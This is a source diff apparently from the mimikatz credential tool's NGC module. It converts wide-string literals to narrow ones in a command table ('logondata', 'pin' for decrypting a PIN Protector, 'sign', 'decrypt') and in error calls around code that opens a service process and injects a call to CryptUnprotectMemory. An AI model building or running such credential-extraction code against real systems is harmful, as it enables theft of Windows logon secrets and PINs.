@@ -6,15 +6,15 @@
 #include "kuhl_m_ngc.h"
 
 const KUHL_M_C kuhl_m_c_ngc[] = {
-	{kuhl_m_ngc_logondata,				L"logondata",				L":)"},
-	{kuhl_m_ngc_pin,					L"pin",						L"Try do decrypt a PIN Protector"},
-	{kuhl_m_ngc_sign,					L"sign",					L"Try to sign"},
-	{kuhl_m_ngc_decrypt,				L"decrypt",					L"Try to decrypt"},
-	{kuhl_m_ngc_enum,					L"enum",					NULL},
+	{kuhl_m_ngc_logondata,				"logondata",				":)"},
+	{kuhl_m_ngc_pin,					"pin",						"Try do decrypt a PIN Protector"},
+	{kuhl_m_ngc_sign,					"sign",					"Try to sign"},
+	{kuhl_m_ngc_decrypt,				"decrypt",					"Try to decrypt"},
+	{kuhl_m_ngc_enum,					"enum",					NULL},
 };
 
 const KUHL_M kuhl_m_ngc = {
-	L"ngc",	L"Next Generation Cryptography module (kiwi use only)",	L"Some commands to enumerate credentials...",
+	L"ngc",	L"Next Generation Cryptography module (kiwi use only)",	"Some commands to enumerate credentials...",
 	ARRAYSIZE(kuhl_m_c_ngc), kuhl_m_c_ngc, NULL, NULL
 };
 
@@ -36,7 +36,7 @@ void dealWithStructToDecode(LPCWSTR type, PstructToDecode d, PKULL_M_MEMORY_HAND
 	PREMOTE_LIB_INPUT_DATA iData;
 	REMOTE_LIB_OUTPUT_DATA oData;
 
-	REMOTE_EXT extensions[] = {{L"dpapi.dll", "CryptUnprotectMemory", (PVOID) 0x4141414141414141, NULL},};
+	REMOTE_EXT extensions[] = {{L"dpapi.dll", L"CryptUnprotectMemory", (PVOID) 0x4141414141414141, NULL},};
 	MULTIPLE_REMOTE_EXT extForCb = {ARRAYSIZE(extensions), extensions};
 	KULL_M_MEMORY_ADDRESS aRemoteFunc;
 
@@ -196,16 +196,16 @@ NTSTATUS kuhl_m_ngc_logondata(int argc, wchar_t * argv[])
 							kuhl_m_ngc_dealWithNode(&aRemote, NULL, enumit, sizeof(ValueGuidPtr), NULL);
 						}
 					}
-					else PRINT_ERROR_AUTO(L"kull_m_process_getVeryBasicModuleInformationsForName");
+					else PRINT_ERROR_AUTO_C("kull_m_process_getVeryBasicModuleInformationsForName");
 					kull_m_memory_close(aRemote.hMemory);
 				}
 				CloseHandle(hProcess);
 			}
-			else PRINT_ERROR_AUTO(L"OpenProcess");
+			else PRINT_ERROR_AUTO_C("OpenProcess");
 		}
 		else PRINT_ERROR(L"Service is not running\n");
 	}
-	else PRINT_ERROR_AUTO(L"kull_m_service_getUniqueForName");
+	else PRINT_ERROR_AUTO_C("kull_m_service_getUniqueForName");
 	return STATUS_SUCCESS;
 }
 
